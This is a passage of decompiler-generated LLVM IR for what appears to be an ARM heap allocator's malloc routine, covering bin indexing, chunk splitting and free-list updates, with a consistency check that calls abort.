  br i1 %tmp204, label %dec_label_pc_11a98, label %dec_label_pc_11a78

dec_label_pc_11a78:                               ; preds = %dec_label_pc_11a70
  %v1_11a78 = add i32 %v4_11a4c, -4
  store i32 %v1_11a78, i32* %r1.global-to-local, align 4
  %v3_11a7c = udiv i32 %v0_11a70, 8
  store i32 %v3_11a7c, i32* %r2.global-to-local, align 4
  %v4_11a80 = mul nuw i32 %v3_11a7c, 4
  %v5_11a80 = add i32 %v4_11a80, %v1_11a78
  %v6_11a80 = inttoptr i32 %v5_11a80 to i32*
  %v7_11a80 = load i32, i32* %v6_11a80, align 4
  store i32 %v7_11a80, i32* %r0.global-to-local, align 4
  %v2_11a84 = icmp eq i32 %v7_11a80, 0
  br i1 %v2_11a84, label %dec_label_pc_11a98, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_11a78
  %v2_11a88 = add i32 %v7_11a80, 8
  %v3_11a88 = inttoptr i32 %v2_11a88 to i32*
  %v4_11a88 = load i32, i32* %v3_11a88, align 4
  store i32 %v4_11a88, i32* %r3.global-to-local, align 4
  store i32 %v2_11a88, i32* %r0.global-to-local, align 4
  store i32 %v2_11a88, i32* %r4.global-to-local, align 4
  store i32 %v4_11a88, i32* %v6_11a80, align 4
  br label %dec_label_pc_122a0

dec_label_pc_11a98:                               ; preds = %dec_label_pc_11a78, %dec_label_pc_11a70
  %tmp205 = icmp ugt i32 %v0_11a70, 255
  br i1 %tmp205, label %dec_label_pc_11ae8, label %dec_label_pc_11aa0

dec_label_pc_11aa0:                               ; preds = %dec_label_pc_11a98
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %ip.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_11aa8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 64) to i32*), align 4
  %v3_11aac = udiv i32 %v0_11a70, 8
  store i32 %v3_11aac, i32* @r7, align 4
  %v4_11ab0 = mul nuw i32 %v3_11aac, 8
  %v5_11ab0 = add i32 %v4_11aa8, %v4_11ab0
  store i32 %v5_11ab0, i32* %r3.global-to-local, align 4
  %v1_11ab4 = add i32 %v5_11ab0, 44
  store i32 %v1_11ab4, i32* %ip.global-to-local, align 4
  %v1_11ab8 = add i32 %v5_11ab0, 56
  %v2_11ab8 = inttoptr i32 %v1_11ab8 to i32*
  %v3_11ab8 = load i32, i32* %v2_11ab8, align 4
  store i32 %v3_11ab8, i32* %r0.global-to-local, align 4
  %v9_11abc = icmp eq i32 %v3_11ab8, %v1_11ab4
  br i1 %v9_11abc, label %dec_label_pc_11c48, label %dec_label_pc_11ac4

dec_label_pc_11ac4:                               ; preds = %dec_label_pc_11aa0
  %v2_11ac4 = add i32 %v3_11ab8, %v0_11a70
  store i32 %v2_11ac4, i32* %r3.global-to-local, align 4
  %v1_11ac8 = add i32 %v2_11ac4, 4
  %v2_11ac8 = inttoptr i32 %v1_11ac8 to i32*
  %v3_11ac8 = load i32, i32* %v2_11ac8, align 4
  store i32 %v3_11ac8, i32* %r2.global-to-local, align 4
  %v1_11acc = add i32 %v3_11ab8, 12
  %v2_11acc = inttoptr i32 %v1_11acc to i32*
  %v3_11acc = load i32, i32* %v2_11acc, align 4
  store i32 %v3_11acc, i32* %r1.global-to-local, align 4
  %v1_11ad0 = or i32 %v3_11ac8, 1
  store i32 %v1_11ad0, i32* %r2.global-to-local, align 4
  %v1_11ad4 = add i32 %v3_11ab8, 8
  store i32 %v1_11ad4, i32* %r4.global-to-local, align 4
  store i32 %v1_11ad0, i32* %v2_11ac8, align 4
  %v0_11adc = load i32, i32* %ip.global-to-local, align 4
  %v1_11adc = load i32, i32* %r1.global-to-local, align 4
  %v2_11adc = add i32 %v1_11adc, 8
  %v3_11adc = inttoptr i32 %v2_11adc to i32*
  store i32 %v0_11adc, i32* %v3_11adc, align 4
  %v0_11ae0 = load i32, i32* %r1.global-to-local, align 4
  %v1_11ae0 = load i32, i32* %ip.global-to-local, align 4
  %v2_11ae0 = add i32 %v1_11ae0, 12
  %v3_11ae0 = inttoptr i32 %v2_11ae0 to i32*
  store i32 %v0_11ae0, i32* %v3_11ae0, align 4
  br label %dec_label_pc_122a0

dec_label_pc_11ae8:                               ; preds = %dec_label_pc_11a98
  store i32 %v0_11a70, i32* %r0.global-to-local, align 4
  %v1_11aec = call i32 @__malloc_largebin_index(i32 %v0_11a70)
  store i32 %v1_11aec, i32* %r0.global-to-local, align 4
  %v0_11af0 = load i32, i32* @r4, align 4
  %v1_11af0 = and i32 %v0_11af0, 2
  %v2_11af0 = icmp eq i32 %v1_11af0, 0
  store i32 %v1_11aec, i32* @r7, align 4
  br i1 %v2_11af0, label %dec_label_pc_11c48, label %dec_label_pc_11afc

dec_label_pc_11afc:                               ; preds = %dec_label_pc_11ae8
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r1.global-to-local, align 4
  %v4_11b04 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 64) to i32*), align 4
  store i32 %v4_11b04, i32* @r0, align 4
  %v0_11b08 = call i32 @__malloc_consolidate()
  store i32 %v0_11b08, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11c48

dec_label_pc_11b10:                               ; preds = %dec_label_pc_11c5c
  %v1_11b10 = add i32 %v3_11c5c, 4
  %v2_11b10 = inttoptr i32 %v1_11b10 to i32*
  %v3_11b10 = load i32, i32* %v2_11b10, align 4
  store i32 %v3_11b10, i32* %r3.global-to-local, align 4
  %v0_11b14 = load i32, i32* @sl, align 4
  %v1_11b18 = and i32 %v3_11b10, -4
  store i32 %v1_11b18, i32* %r4.global-to-local, align 4
  %v1_11b1c = add i32 %v3_11c5c, 12
  %v2_11b1c = inttoptr i32 %v1_11b1c to i32*
  %v3_11b1c = load i32, i32* %v2_11b1c, align 4
  store i32 %v3_11b1c, i32* %ip.global-to-local, align 4
  %tmp206 = icmp ugt i32 %v0_11b14, 255
  br i1 %tmp206, label %dec_label_pc_11b78, label %dec_label_pc_11b24

dec_label_pc_11b24:                               ; preds = %dec_label_pc_11b10
  %v9_11b24 = icmp eq i32 %v3_11b1c, %v0_11b7c
  br i1 %v9_11b24, label %dec_label_pc_11b2c, label %dec_label_pc_11b78

dec_label_pc_11b2c:                               ; preds = %dec_label_pc_11b24
  %v0_11b2c = load i32, i32* @sb, align 4
  %v1_11b2c = add i32 %v0_11b2c, 48
  %v2_11b2c = inttoptr i32 %v1_11b2c to i32*
  %v3_11b2c = load i32, i32* %v2_11b2c, align 4
  store i32 %v3_11b2c, i32* %r3.global-to-local, align 4
  %v9_11b30 = icmp eq i32 %v3_11c5c, %v3_11b2c
  br i1 %v9_11b30, label %dec_label_pc_11b38, label %dec_label_pc_11b78

dec_label_pc_11b38:                               ; preds = %dec_label_pc_11b2c
  %v1_11b38 = load i32, i32* @fp, align 4
  %tmp207 = icmp ugt i32 %v1_11b18, %v1_11b38
  br i1 %tmp207, label %dec_label_pc_11b40, label %dec_label_pc_11b78

dec_label_pc_11b40:                               ; preds = %dec_label_pc_11b38
  %v2_11b40 = sub i32 %v1_11b18, %v0_11b14
  store i32 %v2_11b40, i32* %r2.global-to-local, align 4
  %v2_11b44 = add i32 %v0_11b14, %v3_11c5c
  store i32 %v2_11b44, i32* %r3.global-to-local, align 4
  %v1_11b48 = or i32 %v0_11b14, 1
  store i32 %v1_11b48, i32* %r0.global-to-local, align 4
  %v1_11b4c = or i32 %v2_11b40, 1
  store i32 %v1_11b4c, i32* %r1.global-to-local, align 4
  %v1_11b50 = add i32 %v3_11c5c, 8
  store i32 %v1_11b50, i32* %r4.global-to-local, align 4
  %v2_11b54 = add i32 %v0_11b7c, 8
  %v3_11b54 = inttoptr i32 %v2_11b54 to i32*
  store i32 %v2_11b44, i32* %v3_11b54, align 4
  %v0_11b58 = load i32, i32* %r3.global-to-local, align 4
  %v1_11b58 = load i32, i32* %ip.global-to-local, align 4
  %v2_11b58 = add i32 %v1_11b58, 12
  %v3_11b58 = inttoptr i32 %v2_11b58 to i32*
  store i32 %v0_11b58, i32* %v3_11b58, align 4
  %v0_11b5c = load i32, i32* %r0.global-to-local, align 4
  %v1_11b5c = load i32, i32* @r6, align 4
  %v2_11b5c = add i32 %v1_11b5c, 4
  %v3_11b5c = inttoptr i32 %v2_11b5c to i32*
  store i32 %v0_11b5c, i32* %v3_11b5c, align 4
  %v0_11b60 = load i32, i32* %r3.global-to-local, align 4
  %v1_11b60 = load i32, i32* @sb, align 4
  %v2_11b60 = add i32 %v1_11b60, 48
  %v3_11b60 = inttoptr i32 %v2_11b60 to i32*
  store i32 %v0_11b60, i32* %v3_11b60, align 4
  %v0_11b64 = load i32, i32* %r2.global-to-local, align 4
  %v1_11b64 = load i32, i32* %r3.global-to-local, align 4
  %v3_11b64 = add i32 %v1_11b64, %v0_11b64
  %v4_11b64 = inttoptr i32 %v3_11b64 to i32*
  store i32 %v0_11b64, i32* %v4_11b64, align 4
  %v0_11b68 = load i32, i32* %r1.global-to-local, align 4
  %v1_11b68 = load i32, i32* %r3.global-to-local, align 4
  %v2_11b68 = add i32 %v1_11b68, 4
  %v3_11b68 = inttoptr i32 %v2_11b68 to i32*
  store i32 %v0_11b68, i32* %v3_11b68, align 4
  %v0_11b6c = load i32, i32* %ip.global-to-local, align 4
  %v1_11b6c = load i32, i32* %r3.global-to-local, align 4
  %v2_11b6c = add i32 %v1_11b6c, 12
  %v3_11b6c = inttoptr i32 %v2_11b6c to i32*
  store i32 %v0_11b6c, i32* %v3_11b6c, align 4
  %v0_11b70 = load i32, i32* %ip.global-to-local, align 4
  %v1_11b70 = load i32, i32* %r3.global-to-local, align 4
  %v2_11b70 = add i32 %v1_11b70, 8
  %v3_11b70 = inttoptr i32 %v2_11b70 to i32*
  store i32 %v0_11b70, i32* %v3_11b70, align 4
  br label %dec_label_pc_122a0

dec_label_pc_11b78:                               ; preds = %dec_label_pc_11b38, %dec_label_pc_11b2c, %dec_label_pc_11b24, %dec_label_pc_11b10
  %v9_11b78 = icmp eq i32 %v1_11b18, %v0_11b14
  %v2_11b7c = add i32 %v3_11b1c, 8
  %v3_11b7c = inttoptr i32 %v2_11b7c to i32*
  store i32 %v0_11b7c, i32* %v3_11b7c, align 4
  %v0_11b80 = load i32, i32* %ip.global-to-local, align 4
  %v1_11b80 = load i32, i32* %r5.global-to-local, align 4
  %v2_11b80 = add i32 %v1_11b80, 12
  %v3_11b80 = inttoptr i32 %v2_11b80 to i32*
  store i32 %v0_11b80, i32* %v3_11b80, align 4
  br i1 %v9_11b78, label %dec_label_pc_11cd8.loopexit, label %dec_label_pc_11b94

dec_label_pc_11b94:                               ; preds = %dec_label_pc_11b78
  %v0_11b94 = load i32, i32* %r4.global-to-local, align 4
  %tmp208 = icmp ugt i32 %v0_11b94, 255
  br i1 %tmp208, label %dec_label_pc_11bb8, label %dec_label_pc_11b9c

dec_label_pc_11b9c:                               ; preds = %dec_label_pc_11b94
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r2.global-to-local, align 4
  %v1_11ba0 = load i32, i32* %r8.global-to-local, align 4
  %v2_11ba0 = add i32 %v1_11ba0, ptrtoint (i32* @global_var_21698.346 to i32)
  %v3_11ba0 = inttoptr i32 %v2_11ba0 to i32*
  %v4_11ba0 = load i32, i32* %v3_11ba0, align 4
  %v3_11ba4 = udiv i32 %v0_11b94, 8
  store i32 %v3_11ba4, i32* %r0.global-to-local, align 4
  %v4_11ba8 = mul nuw i32 %v3_11ba4, 8
  %v5_11ba8 = add i32 %v4_11ba0, %v4_11ba8
  store i32 %v5_11ba8, i32* %r3.global-to-local, align 4
  %v1_11bac = add i32 %v5_11ba8, 44
  store i32 %v1_11bac, i32* %ip.global-to-local, align 4
  %v1_11bb0 = add i32 %v5_11ba8, 52
  %v2_11bb0 = inttoptr i32 %v1_11bb0 to i32*
  %v3_11bb0 = load i32, i32* %v2_11bb0, align 4
  store i32 %v3_11bb0, i32* @lr, align 4
  br label %dec_label_pc_11c10

dec_label_pc_11bb8:                               ; preds = %dec_label_pc_11b94
  store i32 %v0_11b94, i32* %r0.global-to-local, align 4
  %v1_11bbc = call i32 @__malloc_largebin_index(i32 %v0_11b94)
  store i32 %v1_11bbc, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %ip.global-to-local, align 4
  %v1_11bc4 = load i32, i32* %r8.global-to-local, align 4
  %v2_11bc4 = add i32 %v1_11bc4, ptrtoint (i32* @global_var_21698.346 to i32)
  %v3_11bc4 = inttoptr i32 %v2_11bc4 to i32*
  %v4_11bc4 = load i32, i32* %v3_11bc4, align 4
  %v4_11bc8 = mul i32 %v1_11bbc, 8
  %v5_11bc8 = add i32 %v4_11bc4, %v4_11bc8
  store i32 %v5_11bc8, i32* %r3.global-to-local, align 4
  %v1_11bcc = add i32 %v5_11bc8, 44
  store i32 %v1_11bcc, i32* %ip.global-to-local, align 4
  %v1_11bd0 = add i32 %v5_11bc8, 52
  %v2_11bd0 = inttoptr i32 %v1_11bd0 to i32*
  %v3_11bd0 = load i32, i32* %v2_11bd0, align 4
  store i32 %v3_11bd0, i32* @lr, align 4
  %v9_11bd4 = icmp eq i32 %v3_11bd0, %v1_11bcc
  br i1 %v9_11bd4, label %dec_label_pc_11c10, label %dec_label_pc_11bdc

dec_label_pc_11bdc:                               ; preds = %dec_label_pc_11bb8
  %v1_11bdc = add i32 %v5_11bc8, 56
  %v2_11bdc = inttoptr i32 %v1_11bdc to i32*
  %v3_11bdc = load i32, i32* %v2_11bdc, align 4
  store i32 %v3_11bdc, i32* %r1.global-to-local, align 4
  %v1_11be0 = add i32 %v3_11bdc, 4
  %v2_11be0 = inttoptr i32 %v1_11be0 to i32*
  %v3_11be0 = load i32, i32* %v2_11be0, align 4
  store i32 %v3_11be0, i32* %r3.global-to-local, align 4
  %v0_11be4 = load i32, i32* %r4.global-to-local, align 4
  %v3_11be4 = icmp ult i32 %v0_11be4, %v3_11be0
  br i1 %v3_11be4, label %.thread, label %dec_label_pc_11c00.preheader

.thread:                                          ; preds = %dec_label_pc_11bdc
  store i32 %v1_11bcc, i32* @lr, align 4
  store i32 %v3_11bdc, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11c10

dec_label_pc_11c00.preheader:                     ; preds = %dec_label_pc_11bdc
  %v2_11bec = or i32 %v0_11be4, 1
  store i32 %v2_11bec, i32* %r2.global-to-local, align 4
  %v1_11c00182 = add i32 %v3_11bd0, 4
  %v2_11c00183 = inttoptr i32 %v1_11c00182 to i32*
  %v3_11c00184 = load i32, i32* %v2_11c00183, align 4
  store i32 %v3_11c00184, i32* %r3.global-to-local, align 4
  %v3_11c04186 = icmp ult i32 %v2_11bec, %v3_11c00184
  br i1 %v3_11c04186, label %dec_label_pc_11bfc, label %dec_label_pc_11c0c

dec_label_pc_11bfc:                               ; preds = %dec_label_pc_11c00.preheader, %dec_label_pc_11bfc
  %v0_11c0c187 = phi i32 [ %v3_11bfc, %dec_label_pc_11bfc ], [ %v3_11bd0, %dec_label_pc_11c00.preheader ]
  %v1_11bfc = add i32 %v0_11c0c187, 8
  %v2_11bfc = inttoptr i32 %v1_11bfc to i32*
  %v3_11bfc = load i32, i32* %v2_11bfc, align 4
  store i32 %v3_11bfc, i32* @lr, align 4
  %v1_11c00 = add i32 %v3_11bfc, 4
  %v2_11c00 = inttoptr i32 %v1_11c00 to i32*
  %v3_11c00 = load i32, i32* %v2_11c00, align 4
  store i32 %v3_11c00, i32* %r3.global-to-local, align 4
  %v3_11c04 = icmp ult i32 %v2_11bec, %v3_11c00
  br i1 %v3_11c04, label %dec_label_pc_11bfc, label %dec_label_pc_11c0c

dec_label_pc_11c0c:                               ; preds = %dec_label_pc_11bfc, %dec_label_pc_11c00.preheader
  %v0_11c0c.lcssa = phi i32 [ %v3_11bd0, %dec_label_pc_11c00.preheader ], [ %v3_11bfc, %dec_label_pc_11bfc ]
  %v1_11c0c = add i32 %v0_11c0c.lcssa, 12
  %v2_11c0c = inttoptr i32 %v1_11c0c to i32*
  %v3_11c0c = load i32, i32* %v2_11c0c, align 4
  store i32 %v3_11c0c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_11c10

dec_label_pc_11c10:                               ; preds = %.thread, %dec_label_pc_11bb8, %dec_label_pc_11b9c, %dec_label_pc_11c0c
  %v0_11c30 = phi i32 [ %v1_11bcc, %dec_label_pc_11bb8 ], [ %v1_11bac, %dec_label_pc_11b9c ], [ %v3_11c0c, %dec_label_pc_11c0c ], [ %v3_11bdc, %.thread ]
  %v0_11c24 = phi i32 [ %v1_11bbc, %dec_label_pc_11bb8 ], [ %v3_11ba4, %dec_label_pc_11b9c ], [ %v1_11bbc, %dec_label_pc_11c0c ], [ %v1_11bbc, %.thread ]
  %v1_11c14 = phi i32 [ %v1_11bc4, %dec_label_pc_11bb8 ], [ %v1_11ba0, %dec_label_pc_11b9c ], [ %v1_11bc4, %dec_label_pc_11c0c ], [ %v1_11bc4, %.thread ]
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r2.global-to-local, align 4
  %v2_11c14 = add i32 %v1_11c14, ptrtoint (i32* @global_var_21698.346 to i32)
  %v3_11c14 = inttoptr i32 %v2_11c14 to i32*
  %v4_11c14 = load i32, i32* %v3_11c14, align 4
  %v3_11c18 = sdiv i32 %v0_11c24, 32
  store i32 %v3_11c18, i32* %r3.global-to-local, align 4
  %v4_11c1c = mul nsw i32 %v3_11c18, 4
  %v5_11c1c = add i32 %v4_11c14, %v4_11c1c
  store i32 %v5_11c1c, i32* %r1.global-to-local, align 4
  %v1_11c20 = add i32 %v5_11c1c, 820
  %v2_11c20 = inttoptr i32 %v1_11c20 to i32*
  %v3_11c20 = load i32, i32* %v2_11c20, align 4
  %v1_11c24 = urem i32 %v0_11c24, 32
  store i32 %v1_11c24, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v7_11c2c = shl i32 1, %v1_11c24
  %v8_11c2c = or i32 %v3_11c20, %v7_11c2c
  store i32 %v8_11c2c, i32* %r3.global-to-local, align 4
  %v1_11c30 = load i32, i32* @r6, align 4
  %v2_11c30 = add i32 %v1_11c30, 12
  %v3_11c30 = inttoptr i32 %v2_11c30 to i32*
  store i32 %v0_11c30, i32* %v3_11c30, align 4
  %v0_11c34 = load i32, i32* @lr, align 4
  %v1_11c34 = load i32, i32* @r6, align 4
  %v2_11c34 = add i32 %v1_11c34, 8
  %v3_11c34 = inttoptr i32 %v2_11c34 to i32*
  store i32 %v0_11c34, i32* %v3_11c34, align 4
  %v0_11c38 = load i32, i32* %r3.global-to-local, align 4
  %v1_11c38 = load i32, i32* %r1.global-to-local, align 4
  %v2_11c38 = add i32 %v1_11c38, 820
  %v3_11c38 = inttoptr i32 %v2_11c38 to i32*
  store i32 %v0_11c38, i32* %v3_11c38, align 4
  %v0_11c3c = load i32, i32* @r6, align 4
  %v1_11c3c = load i32, i32* @lr, align 4
  %v2_11c3c = add i32 %v1_11c3c, 12
  %v3_11c3c = inttoptr i32 %v2_11c3c to i32*
  store i32 %v0_11c3c, i32* %v3_11c3c, align 4
  %v0_11c40 = load i32, i32* @r6, align 4
  %v1_11c40 = load i32, i32* %ip.global-to-local, align 4
  %v2_11c40 = add i32 %v1_11c40, 8
  %v3_11c40 = inttoptr i32 %v2_11c40 to i32*
  store i32 %v0_11c40, i32* %v3_11c40, align 4
  %v0_11c5c.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11c5c

dec_label_pc_11c48:                               ; preds = %dec_label_pc_11ae8, %dec_label_pc_11aa0, %dec_label_pc_11afc
  store i32 64, i32* %r8.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21698.346 to i32), i32* %r1.global-to-local, align 4
  %v4_11c50 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21698.346 to i32), i32 64) to i32*), align 4
  store i32 %v4_11c50, i32* @sb, align 4
  %v0_11c54 = load i32, i32* @sl, align 4
  %v1_11c54 = add i32 %v0_11c54, 16
  store i32 %v1_11c54, i32* @fp, align 4
  %v1_11c58 = add i32 %v4_11c50, 52
  store i32 %v1_11c58, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11c5c

dec_label_pc_11c5c:                               ; preds = %dec_label_pc_11c10, %dec_label_pc_11c48
  %v0_11b7c = phi i32 [ %v0_11c5c.pre, %dec_label_pc_11c10 ], [ %v1_11c58, %dec_label_pc_11c48 ]
  %v1_11c5c = add i32 %v0_11b7c, 12
  %v2_11c5c = inttoptr i32 %v1_11c5c to i32*
  %v3_11c5c = load i32, i32* %v2_11c5c, align 4
  store i32 %v3_11c5c, i32* @r6, align 4
  %v9_11c60 = icmp eq i32 %v3_11c5c, %v0_11b7c
  br i1 %v9_11c60, label %dec_label_pc_11c68, label %dec_label_pc_11b10

dec_label_pc_11c68:                               ; preds = %dec_label_pc_11c5c
  %v0_11c68 = load i32, i32* @sl, align 4
  %tmp209 = icmp ult i32 %v0_11c68, 256
  %v0_11d20.pre = load i32, i32* @r7, align 4
  br i1 %tmp209, label %dec_label_pc_11c68.dec_label_pc_11d20_crit_edge, label %dec_label_pc_11c70

dec_label_pc_11c68.dec_label_pc_11d20_crit_edge:  ; preds = %dec_label_pc_11c68
  %.pre203 = mul i32 %v0_11d20.pre, 8
  br label %dec_label_pc_11d20

dec_label_pc_11c70:                               ; preds = %dec_label_pc_11c68
  %v4_11c70 = mul i32 %v0_11d20.pre, 8
  %v5_11c70 = add i32 %v4_11c70, %v0_11b7c
  store i32 %v5_11c70, i32* %r3.global-to-local, align 4
  %v1_11c74 = add i32 %v5_11c70, -8
  store i32 %v1_11c74, i32* %r1.global-to-local, align 4
  %v1_11c78 = add i32 %v5_11c70, 4
  %v2_11c78 = inttoptr i32 %v1_11c78 to i32*
  %storemerge.pre = load i32, i32* %v2_11c78, align 4
  br label %dec_label_pc_11d18

dec_label_pc_11c80:                               ; preds = %dec_label_pc_11d18
  %v1_11c80 = add i32 %v1_11ca8, 4
  %v2_11c80 = inttoptr i32 %v1_11c80 to i32*
  %v3_11c80 = load i32, i32* %v2_11c80, align 4
  store i32 %v3_11c80, i32* %r3.global-to-local, align 4
  %v1_11c84 = and i32 %v3_11c80, -4
  store i32 %v1_11c84, i32* %r2.global-to-local, align 4
  %v3_11c88 = icmp ult i32 %v1_11c84, %v0_11c68
  %v1_11c8c = add i32 %v1_11ca8, 12
  %v2_11c8c = inttoptr i32 %v1_11c8c to i32*
  %v3_11c8c = load i32, i32* %v2_11c8c, align 4
  store i32 %v3_11c8c, i32* %r0.global-to-local, align 4
  br i1 %v3_11c88, label %dec_label_pc_11d18, label %dec_label_pc_11c94

dec_label_pc_11c94:                               ; preds = %dec_label_pc_11c80
  %v1_11c94 = add i32 %v1_11ca8, 8
  %v2_11c94 = inttoptr i32 %v1_11c94 to i32*
  %v3_11c94 = load i32, i32* %v2_11c94, align 4
  store i32 %v3_11c94, i32* %r1.global-to-local, align 4
  %v1_11c98 = add i32 %v3_11c94, 12
  %v2_11c98 = inttoptr i32 %v1_11c98 to i32*
  %v3_11c98 = load i32, i32* %v2_11c98, align 4
  store i32 %v3_11c98, i32* %r3.global-to-local, align 4
  %v9_11c9c = icmp eq i32 %v3_11c98, %v1_11ca8
  br i1 %v9_11c9c, label %dec_label_pc_11ca4, label %dec_label_pc_11cb0

dec_label_pc_11ca4:                               ; preds = %dec_label_pc_11c94
  %v1_11ca4 = add i32 %v3_11c8c, 8
  %v2_11ca4 = inttoptr i32 %v1_11ca4 to i32*
  %v3_11ca4 = load i32, i32* %v2_11ca4, align 4
  store i32 %v3_11ca4, i32* %r3.global-to-local, align 4
  %v9_11ca8 = icmp eq i32 %v3_11ca4, %v1_11ca8
  br i1 %v9_11ca8, label %dec_label_pc_11cb4, label %dec_label_pc_11cb0

dec_label_pc_11cb0:                               ; preds = %dec_label_pc_11c94, %dec_label_pc_11ca4
  %v0_11cb0 = call i32 @abort()
  store i32 %v0_11cb0, i32* %r0.global-to-local, align 4
  %v0_11cb4.pre = load i32, i32* @sl, align 4
  %v1_11cb4.pre = load i32, i32* @r2, align 4
  %v0_11cbc.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_11cb4

dec_label_pc_11cb4:                               ; preds = %dec_label_pc_11ca4, %dec_label_pc_11cb0
  %v1_11cbc = phi i32 [ %v3_11c8c, %dec_label_pc_11ca4 ], [ %v0_11cb0, %dec_label_pc_11cb0 ]
  %v0_11cbc = phi i32 [ %v3_11c94, %dec_label_pc_11ca4 ], [ %v0_11cbc.pre, %dec_label_pc_11cb0 ]
  %v1_11cb4 = phi i32 [ %v1_11c84, %dec_label_pc_11ca4 ], [ %v1_11cb4.pre, %dec_label_pc_11cb0 ]
  %v0_11cb4 = phi i32 [ %v0_11c68, %dec_label_pc_11ca4 ], [ %v0_11cb4.pre, %dec_label_pc_11cb0 ]
  %v2_11cb4 = sub i32 %v1_11cb4, %v0_11cb4
  store i32 %v2_11cb4, i32* %lr.global-to-local, align 4
  %v2_11cbc = add i32 %v1_11cbc, 8
  %v3_11cbc = inttoptr i32 %v2_11cbc to i32*
  store i32 %v0_11cbc, i32* %v3_11cbc, align 4
  %v0_11cc0 = load i32, i32* %r0.global-to-local, align 4
  %v1_11cc0 = load i32, i32* %r1.global-to-local, align 4
  %v2_11cc0 = add i32 %v1_11cc0, 12
  %v3_11cc0 = inttoptr i32 %v2_11cc0 to i32*
  store i32 %v0_11cc0, i32* %v3_11cc0, align 4
  %v0_11cc4 = load i32, i32* %ip.global-to-local, align 4
  %v1_11cc4 = add i32 %v0_11cc4, 8
  store i32 %v1_11cc4, i32* %r0.global-to-local, align 4
  %tmp210 = icmp ugt i32 %v2_11cb4, 15
  br i1 %tmp210, label %dec_label_pc_11ce4, label %dec_label_pc_11ccc

dec_label_pc_11ccc:                               ; preds = %dec_label_pc_11cb4
  %v1_11ccc = load i32, i32* %r2.global-to-local, align 4
  %v2_11ccc = add i32 %v1_11ccc, %v0_11cc4
  store i32 %v2_11ccc, i32* %r2.global-to-local, align 4
  %v1_11cd0 = add i32 %v2_11ccc, 4
  %v2_11cd0 = inttoptr i32 %v1_11cd0 to i32*
  %v3_11cd0 = load i32, i32* %v2_11cd0, align 4
  store i32 %v3_11cd0, i32* %r3.global-to-local, align 4
  store i32 %v1_11cc4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11cd8

dec_label_pc_11cd8.loopexit:                      ; preds = %dec_label_pc_11b78
  %v1_11b84 = load i32, i32* @r6, align 4
  %v2_11b84 = load i32, i32* @sl, align 4
  %v3_11b84 = add i32 %v2_11b84, %v1_11b84
  store i32 %v3_11b84, i32* %r2.global-to-local, align 4
  %v2_11b88 = add i32 %v3_11b84, 4
  %v3_11b88 = inttoptr i32 %v2_11b88 to i32*
  %v4_11b88 = load i32, i32* %v3_11b88, align 4
  store i32 %v4_11b88, i32* %r3.global-to-local, align 4
  %v2_11b8c = add i32 %v1_11b84, 8
  store i32 %v2_11b8c, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_11cd8

dec_label_pc_11cd8:                               ; preds = %.dec_label_pc_11cd8_crit_edge, %dec_label_pc_11cd8.loopexit, %dec_label_pc_11ccc
  %v1_11cdc = phi i32 [ %v4_11e00, %.dec_label_pc_11cd8_crit_edge ], [ %v3_11b84, %dec_label_pc_11cd8.loopexit ], [ %v2_11ccc, %dec_label_pc_11ccc ]
  %v0_11cd8 = phi i32 [ %v7_11e00, %.dec_label_pc_11cd8_crit_edge ], [ %v4_11b88, %dec_label_pc_11cd8.loopexit ], [ %v3_11cd0, %dec_label_pc_11ccc ]
  %v1_11cd8 = or i32 %v0_11cd8, 1
  store i32 %v1_11cd8, i32* %r3.global-to-local, align 4
  %v2_11cdc = add i32 %v1_11cdc, 4
  %v3_11cdc = inttoptr i32 %v2_11cdc to i32*
  store i32 %v1_11cd8, i32* %v3_11cdc, align 4
  br label %dec_label_pc_122a0

dec_label_pc_11ce4:                               ; preds = %dec_label_pc_11cb4
  %v1_11ce4 = load i32, i32* @sl, align 4
  %v2_11ce4 = add i32 %v1_11ce4, %v0_11cc4
  store i32 %v2_11ce4, i32* %r2.global-to-local, align 4
  %v1_11ce8 = or i32 %v1_11ce4, 1
  store i32 %v1_11ce8, i32* %r3.global-to-local, align 4
  %v0_11cec = load i32, i32* %lr.global-to-local, align 4
  %v1_11cec = or i32 %v0_11cec, 1
  store i32 %v1_11cec, i32* %r1.global-to-local, align 4
  store i32 %v1_11cc4, i32* %r4.global-to-local, align 4
  %v2_11cf4 = add i32 %v0_11cc4, 4
  %v3_11cf4 = inttoptr i32 %v2_11cf4 to i32*
  store i32 %v1_11ce8, i32* %v3_11cf4, align 4
  %v0_11cf8 = load i32, i32* %r2.global-to-local, align 4
  %v1_11cf8 = load i32, i32* @r6, align 4
  %v2_11cf8 = add i32 %v1_11cf8, 8
  %v3_11cf8 = inttoptr i32 %v2_11cf8 to i32*
  store i32 %v0_11cf8, i32* %v3_11cf8, align 4
  %v0_11cfc = load i32, i32* %r2.global-to-local, align 4
  %v1_11cfc = load i32, i32* @r6, align 4
  %v2_11cfc = add i32 %v1_11cfc, 12
  %v3_11cfc = inttoptr i32 %v2_11cfc to i32*
  store i32 %v0_11cfc, i32* %v3_11cfc, align 4
  %v0_11d00 = load i32, i32* %lr.global-to-local, align 4
  %v1_11d00 = load i32, i32* %r2.global-to-local, align 4
  %v3_11d00 = add i32 %v1_11d00, %v0_11d00
  %v4_11d00 = inttoptr i32 %v3_11d00 to i32*
  store i32 %v0_11d00, i32* %v4_11d00, align 4
